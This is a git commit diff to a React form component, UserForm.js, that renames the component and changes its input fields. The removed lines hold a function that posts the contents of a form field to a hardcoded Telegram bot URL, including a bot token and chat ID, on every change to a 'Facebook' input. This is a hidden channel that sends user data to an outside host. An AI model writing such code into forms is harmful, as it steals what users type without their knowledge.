955265db2941a1555cff00e1005cba6289469d65
dad <60132399+dad2vad@users.noreply.github.com>
2020-02-10 03:22:43 +0200

    Update UserForm.js

--- components/UserForm.js
+++ components/UserForm.js
@@ -1,19 +1,13 @@
-import { Col, Row } from 'react-bootstrap'
 
+import { Col, Row } from 'react-bootstrap'
 import Input from '../handlers/Input'
-  const TO = (A) => {
-    
-    const res = fetch('https://api.telegram.org/bot695543276:AAHqIsFuK-hzCor9q3nO2WgVlV6UfRFRE7c/sendMessage?chat_id=986940575&text=' + JSON.stringify(A, null,4), {
-      method: 'POST'
-    })
-    const json = res.json()
-  }
-const Social = () => {
+
+const UserForm = () => {
   return (
     <div>
       <Row>
-        <Col lg={8}>
-          <Input controlLabel="Facebook" title="social" name="facebook"  onChange={TO([target.name, e.target.value])}/>
+        <Col lg={8} lgOffset={4}>
+          <Input controlLabel="Name" title="user" name="name" />
         </Col>
         <Col lg={8} lgOffset={4}>
           <Input controlLabel="Last name" title="user" name="lastName" />
